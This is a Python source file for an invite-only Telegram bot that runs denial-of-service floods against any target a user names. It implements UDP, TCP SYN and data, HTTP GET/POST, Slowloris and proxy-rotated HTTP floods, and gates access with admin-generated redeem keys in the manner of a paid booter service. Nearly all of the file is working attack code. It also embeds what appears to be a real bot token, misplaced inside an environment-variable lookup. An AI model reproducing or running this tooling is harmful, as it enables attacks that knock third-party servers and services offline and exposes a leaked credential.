import os, asyncio, json, secrets, socket, random, time, threading, requests
from datetime import datetime, timedelta
from colorama import init, Fore
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

init(autoreset=True)

BOT_TOKEN = os.getenv("7358755762:AAGeG6oFabTrhsB_qLzTqSS6CEdQ_y_9qIw")
ADMIN_IDS = {int(x) for x in os.getenv("6286507682", "123456789").split(",")}
DB_FILE = "users.json"

# ---------------- persistence ----------------
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE) as f:
                return json.load(f)
        except Exception:
            pass
    return {"keys": {}, "redeemed": {}}

def save_db(db):
    with open(DB_FILE, "w") as f:
        json.dump(db, f, indent=2)

DB = load_db()

def is_admin(uid): return uid in ADMIN_IDS
def has_access(uid): return is_admin(uid) or str(uid) in DB["redeemed"]

# ---------------- proxy fetch ----------------
def fetch_proxies():
    url = "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt"
    try:
        return [p for p in requests.get(url, timeout=10).text.splitlines() if ":" in p]
    except Exception:
        return []

PROXIES = fetch_proxies()

# ---------------- L4 UDP ----------------
def udp_plain(ip, port, dur, size, rep):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); end = time.time() + dur; n = 0; p = b"A" * size
    try:
        while time.time() < end: s.sendto(p, (ip, port)); n += 1
    finally: s.close(); rep(f"✅ UDP Plain finished — {n} packets")

def udp_random(ip, port, dur, size, rep):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); end = time.time() + dur; n = 0
    try:
        while time.time() < end: s.sendto(random.randbytes(size), (ip, port)); n += 1
    finally: s.close(); rep(f"✅ UDP Random finished — {n} packets")

def udp_burst(ip, port, dur, size, rep):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); end = time.time() + dur; n = 0
    try:
        while time.time() < end:
            for _ in range(10): s.sendto(random.randbytes(size), (ip, port)); n += 1
            time.sleep(0.1)
    finally: s.close(); rep(f"✅ UDP Burst finished — {n} packets")

def udp_frag(ip, port, dur, size, rep):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); end = time.time() + dur; n = 0
    try:
        while time.time() < end:
            p = random.randbytes(max(1, size // 2)); s.sendto(p, (ip, port)); s.sendto(p, (ip, port)); n += 2
    finally: s.close(); rep(f"✅ UDP Frag finished — {n} packets")

def udp_pulse(ip, port, dur, size, rep):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); end = time.time() + dur; n = 0
    try:
        while time.time() < end:
            p = random.randbytes(size)
            for _ in range(5): s.sendto(p, (ip, port)); n += 1
            time.sleep(random.uniform(0.05, 0.2))
    finally: s.close(); rep(f"✅ UDP Pulse finished — {n} packets")

# ---------------- L4 TCP ----------------
def tcp_syn_single(ip, port, dur, size, rep):
    end = time.time() + dur; n = 0
    while time.time() < end:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try: s.connect_ex((ip, port)); n += 1
        finally: s.close()
    rep(f"✅ TCP SYN finished — {n} SYN")

def tcp_syn_multi(ip, port, dur, size, rep, workers=10):
    end = time.time() + dur; lock = threading.Lock(); n = [0]
    def w():
        while time.time() < end:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try: s.connect_ex((ip, port))
            except Exception: pass
            finally: s.close()
            with lock: n[0] += 1
    ts = [threading.Thread(target=w) for _ in range(workers)]
    for t in ts: t.start()
    for t in ts: t.join()
    rep(f"✅ TCP SYN Multi finished — {n[0]} SYN")

def tcp_data(ip, port, dur, size, rep):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    end = time.time() + dur; n = 0; p = random.randbytes(size)
    try:
        s.connect((ip, port))
        while time.time() < end: s.send(p); n += 1
    finally: s.close(); rep(f"✅ TCP Data finished — {n} packets")

# ---------------- L7 HTTP ----------------
def http_get(url, dur, size, rep):
    end = time.time() + dur; n = 0
    while time.time() < end:
        try: requests.get(url, timeout=2); n += 1
        except Exception: pass
    rep(f"✅ HTTP GET finished — {n} requests")

def http_post(url, dur, size, rep):
    end = time.time() + dur; n = 0
    while time.time() < end:
        try: requests.post(url, data={"flood": "x" * 500}, timeout=2); n += 1
        except Exception: pass
    rep(f"✅ HTTP POST finished — {n} requests")

def slowloris(url, dur, size, rep):
    host = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    port = 443 if url.startswith("https") else 80
    end = time.time() + dur; socks = []
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((host, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode()); socks.append(s)
        except Exception: pass
        time.sleep(0.1)
    for s in socks: s.close()
    rep(f"✅ Slowloris finished — {len(socks)} connections")

def http_proxy(url, dur, size, rep):
    end = time.time() + dur; n = 0
    while time.time() < end:
        px = random.choice(PROXIES) if PROXIES else None
        try:
            requests.get(url, proxies={"http": f"http://{px}"} if px else None, timeout=2); n += 1
        except Exception: pass
    rep(f"✅ Proxy GET finished — {n} requests")

L4 = {"udp_plain","udp_random","udp_burst","udp_frag","udp_pulse","tcp_syn_single","tcp_syn_multi","tcp_data"}
L7 = {"http_get","http_post","slowloris","http_proxy"}
METHODS = {
    "udp_plain": udp_plain, "udp_random": udp_random, "udp_burst": udp_burst,
    "udp_frag": udp_frag, "udp_pulse": udp_pulse,
    "tcp_syn_single": tcp_syn_single, "tcp_syn_multi": tcp_syn_multi, "tcp_data": tcp_data,
    "http_get": http_get, "http_post": http_post, "slowloris": slowloris, "http_proxy": http_proxy,
}

def run_attack(method, target, port, dur, size, rep):
    try:
        if method in L4:
            METHODS[method](target, int(port), float(dur), int(size), rep)
        else:
            METHODS[method](target, float(dur), int(size), rep)
    except Exception as e:
        rep(f"❌ {e}")



# ---------------- Telegram handlers ----------------
def access_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌊 UDP Plain", callback_data="udp_plain"),
         InlineKeyboardButton("🌊 UDP Random", callback_data="udp_random")],
        [InlineKeyboardButton("🌊 UDP Burst", callback_data="udp_burst"),
         InlineKeyboardButton("🌊 UDP Frag", callback_data="udp_frag")],
        [InlineKeyboardButton("🌊 UDP Pulse", callback_data="udp_pulse")],
        [InlineKeyboardButton("⚡ TCP SYN", callback_data="tcp_syn_single"),
         InlineKeyboardButton("⚡ TCP SYN Multi", callback_data="tcp_syn_multi")],
        [InlineKeyboardButton("⚡ TCP Data", callback_data="tcp_data")],
        [InlineKeyboardButton("🌐 HTTP GET", callback_data="http_get"),
         InlineKeyboardButton("🌐 HTTP POST", callback_data="http_post")],
        [InlineKeyboardButton("🐌 Slowloris", callback_data="slowloris"),
         InlineKeyboardButton("🔀 Proxy GET", callback_data="http_proxy")],
    ])

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not has_access(uid):
        return await update.message.reply_text(
            "🔒 *Access required*\n\n"
            "This bot is invite-only. Send me your redeem key:\n\n"
            "`/redeem YOUR_KEY`\n\n"
            "No key? Contact the admin.",
            parse_mode="Markdown",
        )
    tag = "👑 admin" if is_admin(uid) else "✅ verified"
    await update.message.reply_text(
        f"Welcome ({tag}). Pick a method:", reply_markup=access_menu()
    )

# ---------- redeem ----------
async def redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if has_access(uid):
        return await update.message.reply_text("You already have access. Use /start.")
    if len(ctx.args) != 1:
        return await update.message.reply_text("Usage: `/redeem YOUR_KEY`", parse_mode="Markdown")

    key = ctx.args[0].strip()
    entry = DB["keys"].get(key)

    if not entry:
        return await update.message.reply_text("❌ Invalid key.")
    if entry.get("used_by"):
        return await update.message.reply_text("❌ Key already used.")
    if entry.get("expires_at") and datetime.utcnow().timestamp() > entry["expires_at"]:
        return await update.message.reply_text("❌ Key expired.")

    entry["used_by"] = uid
    entry["used_at"] = datetime.utcnow().timestamp()
    DB["redeemed"][str(uid)] = {
        "key": key,
        "since": entry["used_at"],
        "duration_h": entry.get("duration_h", 24),
    }
    save_db(DB)
    await update.message.reply_text(
        f"✅ Key accepted! Access for {entry.get('duration_h', 24)}h.\nUse /start."
    )

# ---------- key generation (admin only) ----------
async def genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Admin only.")
    # /genkey <duration_hours>
    try:
        hours = int(ctx.args[0]) if ctx.args else 24
    except ValueError:
        return await update.message.reply_text("Usage: `/genkey <hours>`", parse_mode="Markdown")

    key = "NB-" + secrets.token_hex(4).upper()
    DB["keys"][key] = {
        "created_by": update.effective_user.id,
        "created_at": datetime.utcnow().timestamp(),
        "expires_at": (datetime.utcnow() + timedelta(days=7)).timestamp(),  # key must be redeemed within 7d
        "duration_h": hours,
        "used_by": None,
    }
    save_db(DB)
    await update.message.reply_text(
        f"🔑 Key: `{key}`\nRedeemable for 7 days · grants {hours}h access",
        parse_mode="Markdown",
    )

async def revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Admin only.")
    if not ctx.args:
        return await update.message.reply_text("Usage: `/revoke <user_id>`", parse_mode="Markdown")
    target = ctx.args[0]
    if target in DB["redeemed"]:
        del DB["redeemed"][target]; save_db(DB)
        return await update.message.reply_text(f"✅ Revoked access for {target}")
    await update.message.reply_text("User not found.")

# ---------- method selection ----------
async def pick(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if not has_access(q.from_user.id):
        return await q.edit_message_text("🔒 No access. Use `/redeem KEY`.", parse_mode="Markdown")
    ctx.user_data["method"] = q.data
    await q.edit_message_text(
        f"Method: `{q.data}`\n\nSend:\n`<target> <port> <duration> <size>`\n\n"
        f"Example: `1.2.3.4 80 60 1024`\n(HTTP methods: use URL as target, port ignored)",
        parse_mode="Markdown",
    )

# ---------- run attack ----------
async def attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not has_access(uid):
        return await update.message.reply_text("🔒 No access. Use `/redeem KEY`.", parse_mode="Markdown")
    m = ctx.user_data.get("method")
    if not m:
        return await update.message.reply_text("Use /start first.")
    try:
        target, port, dur, size = update.message.text.split()
    except ValueError:
        return await update.message.reply_text("Format: `<target> <port> <dur> <size>`", parse_mode="Markdown")

    msg = await update.message.reply_text(f"🚀 `{m}` → `{target}` for {dur}s", parse_mode="Markdown")
    loop = asyncio.get_running_loop()

    def rep(text):
        asyncio.run_coroutine_threadsafe(msg.edit_text(text), loop)

    threading.Thread(
        target=run_attack, args=(m, target, port, dur, size, rep), daemon=True
    ).start()

# ---------------- main ----------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("revoke", revoke))
    app.add_handler(CallbackQueryHandler(pick))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, attack))
    print(Fore.GREEN + "Bot running…")
    app.run_polling()

if __name__ == "__main__":
    main()
